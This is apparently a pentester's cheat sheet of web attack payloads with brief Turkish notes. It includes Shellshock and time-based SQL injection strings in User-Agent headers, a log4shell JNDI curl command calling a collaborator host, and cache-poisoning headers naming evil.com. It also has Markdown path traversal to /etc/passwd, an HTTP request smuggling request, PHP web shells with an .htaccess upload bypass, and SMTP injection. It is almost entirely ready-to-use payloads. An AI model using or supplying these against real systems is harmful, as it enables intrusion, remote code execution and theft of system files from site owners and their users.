# HAND BOOK

User-Agent Command Injection
```
 1))%20or%20sleep(20)--
```
```
'">{{7*7}}${2*2}
```
```
() { : ; }; echo ; /bin/bash -c "cat /etc/passwd"
```

User-Agent SQL Injection
```

```
```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927
```

log4shell
```
curl --http1.1 --silent --output /dev/null \
--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
```

Web Cache Poisoning
```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```


MarkDown
```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../../etc/passwd)
```


Chunked diyoruz ve content type ini ayarliyoruz. ayrilmis sorgulari olacagini ve 0 ile de ikinci bir get gonderecegimizi soyluyoruz:
```header
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```


```
data://text/plain;base64,PD9waHAgZWNobygnYWJoaXNoZWttb3JsYTo6OicuIGdldF9jdXJyZW50X3VzZXIoKSAuJzo6OmFiaGlzaGVrbW9ybGEnKTs/Pg==
```

Payload php
```
<?php system($_GET['cmd']); ?>
```
```
<?php echo file_get_contents('/etc/passwd'); ?>
```
```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

Addtype application/x-httpd-php .shell
```

```
Content-Disposition: form-data; name="avatar"; filename="shell.shell"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

Smtp Attack
```
  -----------------------------134475172700422922879687252
  Content-Disposition: form-data; name="subject"
  Test
  .
  MAIL FROM: external@domain1.com
  RCPT TO: external@domain1.com
  RCPT TO: external@domain2.com
  RCPT TO: external@domain3.com
  RCPT TO: external@domain4.com
  Data
  This is an example of SMTP Injection attack
  .
  -----------------------------134475172700422922879687252
```
